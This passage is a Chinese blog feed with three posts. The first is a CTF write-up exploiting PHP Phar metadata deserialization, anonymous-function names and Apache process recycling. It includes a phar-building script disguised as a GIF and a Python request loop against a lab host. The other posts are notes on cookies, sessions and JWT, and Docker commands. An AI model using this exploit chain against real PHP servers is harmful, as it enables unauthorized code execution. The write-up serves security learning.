展示该目录下的avatar.gif</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>思路:</p><ul><li>首先分析代码, 首先分配了一个匿名函数给 flag 变量, 执行了这个函数就会出 flag, 所以整道题的核心就是执行这个匿名函数</li><li>题目主要有两个功能, 一个是在沙盒文件夹任意写入一个 gif, 一个是根据 cookie 中的路径查看这个 gif</li><li>一开始的想法是 —–&gt; admin 是关键类,需要通过反序列化之后的析构函数去触发其中的 eval —–&gt; 通过 lucky 参数去调用这个输出 flag 的函数. 而反序列化的 data 是从 cookie 中获得, 那先尝试一下伪造 cookie,但是其实 cookie 后半部分是用 hash_hmac 和一个未知的秘钥生成的一个签名, 基本上无法伪造…..所以放弃这个想法</li><li>咋一看好像代码里面并没有其他能够反序列化的地方了, 然后就来到了本题的第一个考点–php 中解析 Phar 归档中的 Metadata 的时候可能会有反序列化的操作, 文档中描述的 Phar::getMetadata 操作(<a href="http://php.net/manual/zh/phar.getmetadata.php">http://php.net/manual/zh/phar.getmetadata.php</a>)</li></ul><blockquote><ul><li>Phar?(方便开发者打包和发布 php 应用的类似于 Java 中的 Jar 的一种文件)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-a854e4d73e1be186.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="What is Phar?(官方文档)"></li><li>Phar 归档的结构<br><img src="http://upload-images.jianshu.io/upload_images/6949366-1a263bb5852f77a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Phar(官方文档)"></li><li>Metadata : Phar 归档中可用来描述此文档的一段序列化之后的字符串<img src="http://upload-images.jianshu.io/upload_images/6949366-f850f6f9d027f2df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="usage of Metadata(官方文档)"></li><li>phar_parse_metadata 的初始化调用, 具体 PHP 源码在 ext/phar/phar.c<br>执行流程大致为:<br>….–&gt; phar_open_from_filename(1512 行的 php_stream_open_wrapper 函数可以得知此函数处理 phar://打开本地 phar 文件 1531 行调用下一个函数)<img src="http://upload-images.jianshu.io/upload_images/6949366-a2c524ab1ddaff2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="phar_open_from_filename"><br>–&gt; phar_open_from_fp(1727 行调用下一个函数)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-f61c565686e8f90f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="phar_open_from_fp"><br>–&gt; phar_parse_pharfile(1038、1122 行调用下一个函数)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-4d37aa50d88c5bea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1038行"> &gt; <img src="http://upload-images.jianshu.io/upload_images/6949366-8c514575ce533262.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1122行"><br>–&gt; phar_parse_metadata(函数在 609 行)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-581792f19940680a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="phar_parse_metadata函数"></li></ul></blockquote><ul><li><p>而且题目内 upload 操作提供了<code>file_get_content()</code>函数 其中地址可控,可以利用<code>phar://</code>协议读取本地 phar 文件(phar 协议不支持远程文件[The <em>phar</em> stream wrapper does not operate on remote files, and cannot operate on remote files, and so is allowed even when the allow_url_fopen and allow_url_include INI options are disabled.</p><p>](<a href="http://php.net/manual/zh/phar.using.stream.php)),%E4%B9%9F%E5%B0%B1%E6%98%AF%E8%AF%B4%E5%8F%AA%E8%A6%81%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA">http://php.net/manual/zh/phar.using.stream.php)),也就是说只要构造一个</a> phar 利用 upload 写到服务器目录, 其中 metadata 设置为 Admin 对象,就可以进入 Admin 的析构函数了</p></li><li><p>接下来的问题就是如何猜出那个随机数?<br>答案是基本上猜不出来<a href="https://security.stackexchange.com/questions/101112/can-i-rely-on-openssl-random-pseudo-bytes-being-very-random-in-php">https://security.stackexchange.com/questions/101112/can-i-rely-on-openssl-random-pseudo-bytes-being-very-random-in-php</a> openssl_random_pseudo_bytes 是加密级别的伪随机数生成器<a href="https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator">https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator</a> 这是题目第二个死胡同</p></li><li><p>然后就到了题目的第二个考点, 匿名函数其实是有真正的名字 从注册匿名函数的源码(Zend/zend<em>builtin_functions.c 1854 行) 大佬还对这个逻辑戏谑了一番 <img src="http://upload-images.jianshu.io/upload_images/6949366-5c491572afb463d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="anonymous_functions_has_name"><br><img src="http://upload-images.jianshu.io/upload_images/6949366-3f7ca4a955141198.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="name_of_anonymous_functions"><br>首先名字第一个字符被替换成了\0,也就是空字符 ,然后 do 操作将 lambda</em>%d 中的%d 格式化成匿名函数的个数+1(从 1 开始)<br>所以最后得出的匿名函数的真正名字为:\0lambda_%d(%d 格式化为当前进程的第 n 个匿名函数)</p></li><li><p>但是我们并不能知道当前的匿名函数到底有多少个, 因为每访问一次题目就会生成一个匿名函数; 最后就引出了最后一个考点, Apache-prefork 模型(默认模型)在接受请求后会如何处理,首先 Apache 会默认生成 5 个 child server 去等待用户连接, 默认最高可生成 256 个 child server, 这时候如果用户大量请求, Apache 就会在处理完 MaxRequestsPerChild 个 tcp 连接后 kill 掉这个进程,开启一个新进程处理请求(这里猜测 Orange 大大应该修改了默认的 0,因为 0 为永不 kill 掉子进程 这样就无法 fork 出新进程了) 在这个新进程里面匿名函数就会是从 1 开始的了</p></li></ul><p>最后步骤分别是:</p><ol><li>先生成符合要求的 phar 放入自己的 vps 中, 生成代码为</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$avatar</span> = <span class="hljs-string">&#x27;xxx&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/avatar.phar&#x27;</span>,<span class="hljs-number">0</span>);<br><span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;file.php&#x27;</span>] = <span class="hljs-string">&#x27;&lt;?php ?&gt;&#x27;</span>;<br><span class="hljs-variable">$p</span>-&gt;setMetadata(<span class="hljs-keyword">new</span> Admin());<br><span class="hljs-variable">$p</span>-&gt;setStub(<span class="hljs-string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br>rename(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/avatar.phar&#x27;</span>,<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/avatar.gif&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>再请求<code>?m=upload&amp;url=http://vps</code></li><li>启动 Orange 大大写的 fork 脚本</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://0c166fcd-fdb3-4807-a385-a6cecf962fcd.node4.buuoj.cn/?m=upload&amp;url=phar:///var/www/data/aa8b91c60cf8b507932015218d2c847d&amp;lucky=%00lambda_1&#x27;</span><br><br>header = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;UM_distinctid=1780a89b22a7dd-03a5f4de894f678-4c3f227c-144000-1780a89b22b5be; session-data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A6%3A%22avatar%22%3Bs%3A46%3A%22%2Fvar%2Fwww%2Fdata%2Faa8b91c60cf8b507932015218d2c847d%22%3B%7D-----1415716c7f33898b0082543bd26f12ab93a24e31&#x27;</span><br>&#125;<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r =requests.get(url,headers=header)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>认证及会话管理</title>
    <link href="/2021/05/29/Token%20Session%20Cookie%20JWT/"/>
    <url>/2021/05/29/Token%20Session%20Cookie%20JWT/</url>
    
    <content type="html"><![CDATA[<h1 id="Token-Session-Cookie-JWT"><a href="#Token-Session-Cookie-JWT" class="headerlink" title="Token Session Cookie JWT"></a>Token Session Cookie JWT</h1><h2 id="认证"><a href="#认证" class="headerlink" title="认证:"></a>认证:</h2><p>验证用户的身份 用户密码登录 短信验证码 邮箱验证码</p><h2 id="授权"><a href="#授权" class="headerlink" title="授权:"></a>授权:</h2><p>给以第三方应用访问改账户(个人)的某些信息资源 如：手机安装应用时 app 询问你 是否允许访问相册 使用你的麦克风、摄像头 访问联系人方式；微信小程序登录是否允许获取你的昵称、头像、地区、性别<br>实现授权的方式有：cookie、session、token、OAuth</p><h2 id="凭证"><a href="#凭证" class="headerlink" title="凭证:"></a>凭证:</h2><p>实现认证和授权的前提需要有证书 而这就是认证的凭证</p><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie:"></a>Cookie:</h2><p>用于记录用户的登录状态 <strong>在一级域名和二级域名之间可以共享使用 但不可跨域！</strong><br>| 参数 | 说明 |<br>| :——–: | :———————————————————-: |<br>| name=value | 键值对，设置 cookie 名和对应的值，要求为字符串类型 Unicode-字符编码 二进制-base64 |<br>| domain | cookie 所属域名 默认是当前域名 |<br>| path | 设置 cookie 在哪些目录生效 |<br>| maxAge | cookie 失效时间 整数 负数-1 则是临时 cookie 关闭浏览器就会失效 |<br>| expires | cookie 失效时间 |<br>| secure | 设置协议 https ssl 传输前就会加密数据 |<br>| httpOnly | 无法通过 js 读取到 cookie 但能在 Application 中修改 一定程度上防止了 xss 攻击 |</p><h2 id="Session"><a href="#Session" class="headerlink" title="Session:"></a>Session:</h2><p>基于 cookie 实现的记录服务器与客户端会话状态的机制 session 存于服务器端 sessionid 存储在客户端的 cookie 中<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/1.png"></p><h2 id="Token"><a href="#Token" class="headerlink" title="Token:"></a>Token:</h2><ul><li><p>Access Token<br>|**uid(用户唯一标识)<br>|**time(当前时间的时间戳)<br>|__sign(token 前几位哈希压缩十六进制字符串)<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2.png"><br><strong>不受同源策略的限制！</strong></p></li><li><p>Refresh Token<br>刷新 Access Token 的 其实没有它也可以刷新 Token 但是每次刷新都会要用户输入登录的用户名和密码</p></li></ul><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/3.png"></p><h3 id="Token-和-Session-的区别"><a href="#Token-和-Session-的区别" class="headerlink" title="Token 和 Session 的区别"></a>Token 和 Session 的区别</h3><ul><li>Session 是一种<strong>记录服务器和客户端会话状态的机制，使服务端有状态化，可以记录会话信息</strong>。而 Token 是<strong>令牌</strong>，<strong>访问资源接口（API）时所需要的资源凭证</strong>。Token <strong>使服务端无状态化，不会存储会话信息。</strong></li><li>Session 和 Token 并不矛盾，作为身份认证 Token 安全性比 Session 好，因为每一个请求都有签名还能防止监听以及重放攻击，而 Session 就必须依赖链路层来保障通讯安全了。<strong>如果你需要实现有状态的会话，仍然可以增加 Session 来在服务器端保存一些状态。</strong></li><li>所谓 Session 认证只是简单的把 User 信息存储到 Session 里，因为 SessionID 的不可预测性，暂且认为是安全的。而 Token ，如果指的是 OAuth Token 或类似的机制的话，提供的是 认证 和 授权 ，认证是针对用户，授权是针对 App 。其目的是让某 App 有权利访问某用户的信息。这里的 Token 是唯一的。不可以转移到其它 App 上，也不可以转到其它用户上。Session 只提供一种简单的认证，即只要有此 SessionID ，即认为有此 User 的全部权利。是需要严格保密的，这个数据应该只保存在站方，不应该共享给其它网站或者第三方 App。所以简单来说：<strong>如果你的用户数据可能需要和第三方共享，或者允许第三方调用 API 接口，用 Token 。如果永远只是自己的网站，自己的 App，用什么就无所谓了。</strong></li></ul><h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>利用 json 的一种认证授权机制，也是目前最流行的跨站认证的解决方案</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/4.png"></p><ul><li>跨域时 JWT 位于 POST 请求的数据体里</li><li>一般位于 http 的请求头 Authorization 里 用 Bearer 模式添加</li><li>URL 中包含</li></ul><h3 id="Token-和-JWT-的区别"><a href="#Token-和-JWT-的区别" class="headerlink" title="Token 和 JWT 的区别"></a>Token 和 JWT 的区别</h3><p><strong>相同：</strong></p><ul><li>都是访问资源的令牌</li><li>都可以记录用户的信息</li><li>都是使服务端无状态化</li><li>都是只有验证成功后，客户端才能访问服务端上受保护的资源</li></ul><p><strong>区别：</strong></p><ul><li>Token：服务端验证客户端发送过来的 Token 时，还需要查询数据库获取用户信息，然后验证 Token 是否有效。</li><li>JWT： 将 Token 和 Payload 加密后存储于客户端，服务端只需要使用密钥解密进行校验（校验也是 JWT 自己实现的）即可，不需要查询或者减少查询数据库，因为 JWT 自包含了用户信息和加密的数据。</li></ul><p><strong>使用 cookie 时需要考虑的问题</strong></p><ul><li>因为存储在客户端，容易被客户端篡改，使用前需要验证合法性</li><li>不要存储敏感数据，比如用户密码，账户余额</li><li>使用 httpOnly 在一定程度上提高安全性</li><li>尽量减少 cookie 的体积，能存储的数据量不能超过 4kb</li><li>设置正确的 domain 和 path，减少数据传输</li><li><strong>cookie 无法跨域</strong></li><li>一个浏览器针对一个网站最多存 20 个 Cookie，浏览器一般只允许存放 300 个 Cookie</li><li><strong>移动端对 cookie 的支持不是很好，而 session 需要基于 cookie 实现，所以移动端常用的是 token</strong></li></ul><p><strong>使用 session 时需要考虑的问题</strong></p><ul><li>将 session 存储在服务器里面，当用户同时在线量比较多时，这些 session 会占据较多的内存，需要在服务端定期的去清理过期的 session</li><li>当网站采用<strong>集群部署</strong>的时候，会遇到多台 web 服务器之间如何做 session 共享的问题。因为 session 是由单个服务器创建的，但是处理用户请求的服务器不一定是那个创建 session 的服务器，那么该服务器就无法拿到之前已经放入到 session 中的登录凭证之类的信息了。</li><li>当多个应用要共享 session 时，除了以上问题，还会遇到跨域问题，因为不同的应用可能部署的主机不一样，需要在各个应用做好 cookie 跨域的处理。</li><li><strong>sessionId 是存储在 cookie 中的，假如浏览器禁止 cookie 或不支持 cookie 怎么办？</strong> 一般会把 sessionId 跟在 url 参数后面即重写 url，所以 session 不一定非得需要靠 cookie 实现</li><li><strong>移动端对 cookie 的支持不是很好，而 session 需要基于 cookie 实现，所以移动端常用的是 token</strong></li></ul><p><strong>使用 token 时需要考虑的问题</strong></p><ul><li>如果你认为用数据库来存储 token 会导致查询时间太长，可以选择放在内存当中。比如 redis 很适合你对 token 查询的需求。</li><li><strong>token 完全由应用管理，所以它可以避开同源策略</strong></li><li><strong>token 可以避免 CSRF 攻击(因为不需要 cookie 了)</strong></li><li><strong>移动端对 cookie 的支持不是很好，而 session 需要基于 cookie 实现，所以移动端常用的是 token</strong></li></ul><p><strong>使用 JWT 时需要考虑的问题</strong></p><ul><li>因为 JWT 并不依赖 Cookie 的，所以你可以使用任何域名提供你的 API 服务而不需要担心跨域资源共享问题（CORS）</li><li>JWT 默认是不加密，但也是可以加密的。生成原始 Token 以后，可以用密钥再加密一次。</li><li>JWT 不加密的情况下，不能将秘密数据写入 JWT。</li><li>JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。</li><li>JWT 最大的优势是服务器不再需要存储 Session，使得服务器认证鉴权业务可以方便扩展。但这也是 JWT 最大的缺点：由于服务器不需要存储 Session 状态，因此使用过程中无法废弃某个 Token 或者更改 Token 的权限。也就是说一旦 JWT 签发了，到期之前就会始终有效，除非服务器部署额外的逻辑。</li><li>JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT 的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。</li><li>JWT 适合一次性的命令认证，颁发一个有效期极短的 JWT，即使暴露了危险也很小，由于每次操作都会生成新的 JWT，因此也没必要保存 JWT，真正实现无状态。</li><li>为了减少盗用，JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。</li></ul>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker</title>
    <link href="/2021/05/27/Docker/"/>
    <url>/2021/05/27/Docker/</url>
    
    <content type="html"><![CDATA[<h1 id="Docker🐋"><a href="#Docker🐋" class="headerlink" title="Docker🐋"></a>Docker🐋</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>众所周知 开发一个项目时 有几个阶段： 开发、测试、生产 而开发时会遇到开发环境的差异 而造成开发的项目出现水土不服 此时为了避免出现这种情况 可以把软件以及环境打包 即解决了软件跨环境迁移的问题 Docker 就是装这个包的容器</p><ul><li><input checked="" disabled="" type="checkbox"> 开源</li><li><input checked="" disabled="" type="checkbox"> Go 语言</li><li><input checked="" disabled="" type="checkbox"> 打包后可以迁移到任何的 linux 的主机上</li><li><input checked="" disabled="" type="checkbox"> 沙箱机制 相互隔离 互不影响 <del>Docker 逃逸</del></li></ul><h2 id="二、架构"><a href="#二、架构" class="headerlink" title="二、架构"></a>二、架构</h2><p><strong>镜像：</strong>Docker 镜像可以类比为 类<br><strong>容器：</strong>可以看作是镜像的 对象 可：创建、启动、停止、删除、暂停<br><strong>仓库：</strong>用来保存镜像</p><p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fhbimg.b0.upaiyun.com%2F3d7083fa7d291a90b05822583933224958a2af4d9067-6N1RKd_fw658&refer=http%3A%2F%2Fhbimg.b0.upaiyun.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1620113477&t=45b612ce6703b9aed09040223b8fee44"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fseo-1255598498.file.myqcloud.com%2Ffull%2F66ec0965a96e9a6d2d1c191ebcc8807ba71baa93.jpg&refer=http%3A%2F%2Fseo-1255598498.file.myqcloud.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1620113819&t=6abc442e6df87436f6b850b78b48ceda"></p><h2 id="三、命令"><a href="#三、命令" class="headerlink" title="三、命令"></a>三、命令</h2><p>阿里云弄一下镜像加速器</p><p>docker</p><ul><li>服务：</li></ul><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">启动<span class="hljs-keyword"> system</span>ctl start docaker<br>停止<span class="hljs-keyword"> system</span>ctl stop docker<br>重启<span class="hljs-keyword"> system</span>ctl restart docker<br>开机自启<span class="hljs-keyword"> system</span>ctl enable docker<br></code></pre></td></tr></table></figure><ul><li>镜像：</li></ul><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">local</span>：<br>查看 <span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">images</span><br>删除(注意不能删除正在运行的容器) <span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">rmi</span> <span class="hljs-selector-tag">id</span>(image)/<span class="hljs-selector-tag">redis</span>:<span class="hljs-selector-tag">version</span><br><span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">rmi</span> `<span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">images</span> <span class="hljs-selector-tag">-q</span>`(全删 `为esc的键)<br><span class="hljs-selector-tag">remote</span>(加速器)：<br>搜索 <span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">search</span> <span class="hljs-selector-tag">redis</span><br>拉取 <span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">pull</span> <span class="hljs-selector-tag">redis</span> (:version)<br></code></pre></td></tr></table></figure><p>有时要到他的官方仓库找镜像 搜索命令不一定能看到你需要的版本</p><ul><li>⭐ 容器：</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">创建 docker run -i(保持运行) -t(分配终端接收命令) --name=first 镜像名(:version(有多个版本时)) <span class="hljs-regexp">/bin/</span>bash(进入容器 打开shell 可省略) <span class="hljs-keyword">exit</span>退出 容器关闭<br>     参数也能写作 -it(称作交互式容器) --name first<br>查看所有容器 docker ps -a (up正在运行 exited退出)<br>后台创建 docker run -id(守护式容器) --name=first 镜像名 <span class="hljs-regexp">/bin/</span>bash(不进入容器) 容器退出后不会关闭<br>进入 docker exec -it first <span class="hljs-regexp">/bin/</span>bash(不可省略)<br>启动(已经停止的容器) docker start 镜像id/镜像名<br>停止 docker stop 镜像名<br>查看 docker inspect 镜像名<br>删除 docker rm 容器id<br>docker rm `docker ps -a -q`(全删)<br></code></pre></td></tr></table></figure><h2 id="四、数据卷"><a href="#四、数据卷" class="headerlink" title="四、数据卷"></a>四、数据卷</h2><p>问题：<br>1、Docker 容器删除后 容器中产生的数据还有吗 没有</p><p>2、容器之间怎么数据交互</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210404155318730.png"></p><p><strong>物理机 windows 上 vm 搭建 linux linux 上使用 Docker</strong><br>3、Docker 容器与外部的物理机(注意物理机指 windows)能直接交互文件吗 不能<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210404155426461.png"></p><ul><li><p>数据卷是 linux 的一个目录或文件 把容器装载到数据卷上(对方的修改都会立即同步）<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210404155501288.png"></p></li><li><p>一个数据卷可以装载多个容器</p></li></ul><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210404155156627.png"></p><ul><li><p>一个容器可以挂载多个数据卷<br><code>docker -it --name=first \</code><br><code>-v ../../...</code><br><code>-v ../../xxx</code></p></li><li><p><input checked="" disabled="" type="checkbox">  数据卷可以和物理机交换文件</p></li><li><p><input checked="" disabled="" type="checkbox">  容器间通过数据卷完成数据交互</p></li></ul><p>配置数据卷在创建容器时使用<code>-v ../../../xxx(绝对路径)</code></p><p>路径在 linux 的路径下设置</p><p>问题 1：删除容器后 Docker 没有了产生的数据 但数据卷会保留容器产生的数据 扩展：恢复容器再次挂载数据卷 数据仍然可以使用</p><p>2：同一个数据卷的容器 在数据卷的内容相同 对数据卷的操作同时生效</p><h2 id="五、数据卷容器"><a href="#五、数据卷容器" class="headerlink" title="五、数据卷容器"></a>五、数据卷容器</h2><p>当多容器进行数据交换时 再使用同一个数据卷就不方便了 此时需要数据卷容器</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210404155917095.png"></p><p>此时相当于两个容器 c1c2 直接挂载到数据卷上 假如此时的 C3 坏了 c1c2 与数据卷的联系也没有断</p><p>挂载步骤</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">c3:<br>docker <span class="hljs-builtin-name">run</span> -it <span class="hljs-attribute">--name</span>=c3 -v **/volume(此目录不可改 由Docker分配)** 镜像名<br><br>c1c2:<br>docker <span class="hljs-builtin-name">run</span> -it <span class="hljs-attribute">--name</span>=c1 --volumns-from c3 镜像名<br><br>docker <span class="hljs-builtin-name">run</span> -it <span class="hljs-attribute">--name</span>=c2 --volumns-from c3 镜像名<br></code></pre></td></tr></table></figure><h2 id="六、应用部署"><a href="#六、应用部署" class="headerlink" title="六、应用部署"></a>六、应用部署</h2><h3 id="Ⅰ、部署-MySQL"><a href="#Ⅰ、部署-MySQL" class="headerlink" title="Ⅰ、部署 MySQL"></a>Ⅰ、部署 MySQL</h3><ol><li>搜索 mysql 镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search mysql<br></code></pre></td></tr></table></figure><ol start="2"><li>拉取 mysql 镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull mysql:5.6<br></code></pre></td></tr></table></figure><ol start="3"><li>创建容器，设置端口映射、目录映射</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 在/root目录下创建mysql目录用于存储mysql数据信息</span><br>mkdir ~/mysql<br>cd ~/mysql<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -id \<br>-p 3307:3306 \<br>--name=c_mysql \<br>-v $PWD/conf:/etc/mysql/conf.d \<br>-v $PWD/logs:/logs \<br>-v $PWD/data:/var/lib/mysql \<br>-e MYSQL_ROOT_PASSWORD=123456 \<br>mysql:5.6<br></code></pre></td></tr></table></figure><ul><li>参数说明：<ul><li><strong>-p 3307:3306</strong>：将容器的 3306 端口映射到宿主机的 3307 端口。</li><li><strong>-v $PWD/conf:/etc/mysql/conf.d</strong>：将主机当前目录下的 conf/my.cnf 挂载到容器的 /etc/mysql/my.cnf。配置目录</li><li><strong>-v $PWD/logs:/logs</strong>：将主机当前目录下的 logs 目录挂载到容器的 /logs。日志目录</li><li><strong>-v $PWD/data:/var/lib/mysql</strong> ：将主机当前目录下的 data 目录挂载到容器的 /var/lib/mysql 。数据目录</li><li><strong>-e MYSQL_ROOT_PASSWORD=123456：</strong>初始化 root 用户的密码。</li></ul></li></ul><ol start="4"><li>进入容器，操作 mysql</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker exec –it c_mysql /bin/bash<br></code></pre></td></tr></table></figure><ol start="5"><li>使用外部机器连接容器中的 mysql</li></ol><h3 id="Ⅱ、部署-Tomcat"><a href="#Ⅱ、部署-Tomcat" class="headerlink" title="Ⅱ、部署 Tomcat"></a>Ⅱ、部署 Tomcat</h3><ol><li>搜索 tomcat 镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search tomcat<br></code></pre></td></tr></table></figure><ol start="2"><li>拉取 tomcat 镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull tomcat<br></code></pre></td></tr></table></figure><ol start="3"><li>创建容器，设置端口映射、目录映射</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 在/root目录下创建tomcat目录用于存储tomcat数据信息</span><br>mkdir ~/tomcat<br>cd ~/tomcat<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -id --name=c_tomcat \<br>-p 8080:8080 \<br>-v $PWD:/usr/local/tomcat/webapps \<br>tomcat<br></code></pre></td></tr></table></figure><ul><li><p>参数说明：</p><ul><li><p><strong>-p 8080:8080：</strong>将容器的 8080 端口映射到主机的 8080 端口</p><p><strong>-v $PWD:/usr/local/tomcat/webapps：</strong>将主机中当前目录挂载到容器的 webapps</p></li></ul></li></ul><ol start="4"><li>使用外部机器访问 tomcat</li></ol><h3 id="Ⅲ、部署-Nginx"><a href="#Ⅲ、部署-Nginx" class="headerlink" title="Ⅲ、部署 